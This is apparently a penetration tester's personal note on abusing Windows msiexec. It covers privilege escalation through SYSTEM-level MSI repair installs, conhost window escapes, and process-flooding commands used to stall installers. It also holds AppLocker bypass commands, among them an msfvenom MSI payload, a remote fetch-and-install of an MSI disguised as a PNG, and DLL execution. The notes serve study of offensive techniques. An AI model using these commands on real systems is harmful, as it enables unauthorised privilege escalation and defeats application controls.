# msiexec
20240402
!! need to process this link still : https://badoption.eu/blog/2023/10/03/MSIFortune.html
[[applocker]]
[[privilege_escalation]]

## About

MsiExec.exe is the executable program of the Windows Installer used to interpret installation packages and install products on target systems. After you build your release, you can install your Windows Installer package (.msi) from the command line. Currently, there is no support for passing Windows Installer parameters other than at the Setup.exe command line. To ensure that Windows Installer is installed on a target system, InstallShield creates a Setup.exe for your application by default. Setup.exe installs Windows Installer if it is not present on the target system or upgrades Windows Installer if an older version is present.

After building a release of your product, you can install it from the command line.

https://docs.revenera.com/isxhelp23/helplibrary/IHelpCmdLineMSI.htm

It's a less known feature but a user with low priveleges can start the repair function of an install, and that will run with system privileges. 

There is a post from Mandiant (https://www.mandiant.com/resources/blog/privileges-third-party-windows-installers) that should be referred to, which dives into the repairs function of MSI installers. [[privilege_escalation]]

https://badoption.eu/blog/2023/10/03/MSIFortune.html

## Repair Install 
### What is it? 
MSI installers will be cached to a `C:\Windows\installer` path, however they are done so under a random name. This means that we cannot at this point easily identify which installer is for which software package. 

https://badoption.eu/blog/2023/10/03/MSIFortune.html
### tool
THere is s tool from Mandiant, that can assist red teams in identifying which random cache corresponds to which package. With this tool they can also download the relevant file allowing them to investigate potential [[privilege_escalation]] opportunities with the repair install. 

https://github.com/mandiant/msi-search
Once downloaded the adversary could potentially identify some credentials packed into the installer or a PS1 file. 

https://badoption.eu/blog/2023/10/03/MSIFortune.html


### process and  Commands 
Repairing an install can be done with the `/fa` and the randomised MSI file. So the command will look like this: 

```
msiexec /fa C:\Windows\installer\MSIfile.msi
```
The `MSIfile.msi` will appear like a random number `1314616.msi` but we can use `identifyingNumber` with `WMI`
```
PS C:\> wmic product get identifyingnumber,name,vendor,version
```
This will return the corresponding packages and their corresponding `identifyingNumber`. 

Using [[powershell]] we can run the repair install with the following: 
```
$installed = Get-WmiObject Win32_Product
$string= $installed | select-string -pattern "PRODUCTNAME"
$string[0] -match '{\w{8}-\w{4}-\w{4}-\w{4}-\w{12}}'
Start-Process -FilePath "msiexec.exe" -ArgumentList "/fa $($matches[0])"
```
This repair will then run with a `NT SYSTEM` account. 

If there is [[sccm]] in place, and aversary can enumerate the [[sccm]]. If a single [[sccm]] is found to be vulnerable to a [[privilege_escalation]] attack, then all machines in the environment are potentially vulnerable thanks to [[sccm]] 
### Visible Conhost and cmd windows 
A big mistake is to add a custom action, but not quieten the [[cmd]] or [[conhost]] window. This terminal window that pops up. By clicking them property menu a shell with `NT SYSTEM` privs can be spawned via a browser. 


This link here https://badoption.eu/blog/2023/10/03/MSIFortune.html has a GIF where we can see the [[poc]]. 

IT's possible to pause the process by CTRL A in the conhost window. By doing so, we're selecting all the text, potentially allowing us to pause the window from closing. 

If the [[conhost]] runtime is too short, there are possibilities to extend its runtime. If the underlying process is deleting files in a folder and we can write to it, add in a few thousand files there for it to delete and we can then have a chance to react. 

```
1..50000 | foreach { new-item -path "$($env:Appdata)\ProductX\$_.txt"}
```
If it is doing a taskkill, see if we can restart the binary mulitple of times 

Failing that, we can also slow down the system by spawning a lot of cmd processes with some output: 
```
1..500 | foreach { Start-Process -FilePath cmd.exe -ArgumentList '/c dir ' -WindowStyle Minimized}
```
This will overload the resources giveing us time to react. 

### Visisble Powershell 

Similar to the above, we can right click the [[powershell]] header to get to properties where we can click the link (like what was seen above in the GIF.), however we cannot select all the text to pause the process. We need to slow the processes down a bit. 

### Vulnerable installers
If we see the following:
`msiexec.exe`
`|- cmd.exe`
` |- conhost.exe`

Then we have a good chance of having identified a vulnerable installer. (Note does not neccesarily `cmd.exe` but can be any other binary). 

## AppLocaker bypass
### metasploit
[[poc]]
We can use [[metasploit]] in conjunction with msiexec. Where msfvenom can be used to generate MSI files that execute a command or payload. 

```
msfvenom -f msi -p windows/exec CMD=powershell.exe > powershell.msi
```
When the above is exucted the powershell.msi will spawn [[powershell]] bypassing [[applocker]]. 

https://docs.revenera.com/isxhelp23/helplibrary/IHelpCmdLineMSI.htm
### cmd 
If [[cmd]] is blocked, then we can run the following in a run window to bypass the [[applocker]] on [[cmd]]
```
msiexec /quiet /i cmd.msi
```
The cmd prompt will then open. 

https://docs.revenera.com/isxhelp23/helplibrary/IHelpCmdLineMSI.htm

### png files 

Alternatively msiexec utility has the ability to run MSI files that have been renamed to PNG. These files can be executed either locally or remotely from a command prompt or from Windows Run bypassing AppLocker rules. [[png_files]]
```
msiexec /q /i http://192.168.100.3/tmp/cmd.png
```
https://docs.revenera.com/isxhelp23/helplibrary/IHelpCmdLineMSI.htm

## DLL Execution
[[poc]]
Using the following command we can execute a dll file. See below: 

![[images_msiexec_1.png]]
```
msiexec /y C:\path\to\sussy.dll
```
https://twitter.com/PhilipTsukerman/status/992021361106268161



